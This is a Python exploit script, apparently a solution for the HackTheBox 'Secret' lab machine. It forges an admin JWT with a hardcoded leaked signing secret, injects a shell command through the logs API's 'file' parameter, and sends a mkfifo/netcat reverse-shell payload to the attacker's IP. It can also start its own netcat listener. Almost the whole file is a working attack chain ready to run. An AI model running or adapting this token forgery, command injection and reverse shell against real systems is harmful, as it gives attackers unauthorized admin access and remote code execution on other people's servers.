#!/usr/bin/python3

import requests, argparse, jwt, netifaces
from time import sleep
from shlex import split
from signal import signal, SIGINT
from sys import exit
from colorama import Fore, init
from subprocess import run
from threading import Thread
from libs import randcred

init(autoreset=True)

#colors
black, green, red, reset, yellow, lgcyan, lgyellow = Fore.BLACK, Fore.GREEN, Fore.RED, Fore.RESET, Fore.YELLOW, Fore.LIGHTCYAN_EX, Fore.LIGHTYELLOW_EX
info = f"{lgcyan}[{yellow}*{lgcyan}]{reset}"
error = f"{lgyellow}[{red}!{lgyellow}]{reset}"

# Global variables
base_url = "http://secret.htb/"
register_url = base_url + "api/user/register"
login_url = base_url + "api/user/login"
priv_url = base_url + "api/priv"
log_url = base_url + "api/logs"
token_secret = "gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE"

def captureIp(iface):
	try:
		iface_details = netifaces.ifaddresses(iface)
	except Exception as e:
		print(f"{error} Give a valid interface")
		for interf in netifaces.interfaces():
			print(f"{yellow}    \__:{green}{interf}")
		exit()
	host = iface_details[netifaces.AF_INET][0]["addr"]
	print(f"{info} Your {green}HackTheBox {reset}IP: {yellow}{host}")
	return host

def genCredentials():
	user = randcred.Generator(length=6).genRandStr()
	password = randcred.Generator(length=10, special=True).genRandStr()
	return user, password

def register(user, password, email):
	global s
	json_post_data = {
		"name" : user,
		"email" : email,
		"password" : password
	}
	s = requests.Session()
	r = s.post(register_url, json=json_post_data)
	if "user" in r.text:
		return 1
	else:
		print(f"{error} Something {red}went wrong: {yellow}{r.text}")
		exit()

def login(user, password, email):
	json_post_data = {
		"email" : email,
		"password":password
	}
	jwt_token = s.post(login_url, json=json_post_data).text
	print(f"{info} JWT TOKEN: {yellow}{jwt_token}\n")
	sleep(1)
	return jwt_token

def checkJwt(final_jwt):
	header = {
		"auth-token" : final_jwt
	}
	r = requests.get(priv_url, headers=header)
	if "welcome back admin" in r.text:
		print(f"{info} Valid JWT TOKEN: {yellow}{final_jwt}{reset} is a {green}valid admin jwt\n")
		sleep(1)
	else:
		print(f"{error} Something went {red}wrong: {yellow}{r.text}")
		exit()

def convertJwt(jwt_token):
	jwt_decode = jwt.decode(jwt_token, token_secret, algorithms=["HS256"])
	jwt_decode["name"] = "theadmin"
	final_jwt = jwt.encode(jwt_decode, token_secret, algorithm="HS256")
	return final_jwt

def spawnShell():
	print(f"{info} Spawning {yellow}netcat{reset} listener")
	Thread(target=run, args=(split(f"nc -lvnp {port}"),)).start()

def reverseShell(final_jwt):
	header = {
		"auth-token" : final_jwt
	}

	parameters = {
		"file" : f"$({payload})"
	}
	print(f"{info} Sending {lgcyan}payload: {yellow}{payload}")
	sleep(1)
	if netcat:
		spawnShell()
	r = requests.get(log_url, params=parameters, headers=header)

def arguments():
	parser = argparse.ArgumentParser()
	req = parser.add_argument_group("Required Options")
	req.add_argument("-i", "--iface", help="Your HackTheBox Interface", dest="iface", metavar="example: <tun0>", required=True)
	req.add_argument("-p", "--port", help="The listener Port", dest="port", metavar="<port>", required=True)
	parser.add_argument("-nc", "--netcat", help="Spawn Netcat Listener", dest="netcat", action="store_true", default=False)
	args = parser.parse_args()
	return args

def main():
	global payload, host, port, netcat
	args = arguments()
	iface = args.iface
	port = args.port
	netcat = args.netcat
	host = captureIp(iface)
	payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {host} {port} >/tmp/f"
	user, password = genCredentials()
	email = f"{user}@{user}.works"
	register(user, password, email)
	jwt_token = login(user, password, email)
	final_jwt = convertJwt(jwt_token)
	checkJwt(final_jwt)
	reverseShell(final_jwt)

def def_handler(sig, frame):
    print(f"\n\n{info} {lgcyan}Exiting...\n")
    exit()

signal(SIGINT, def_handler)

if __name__ == '__main__':
	main()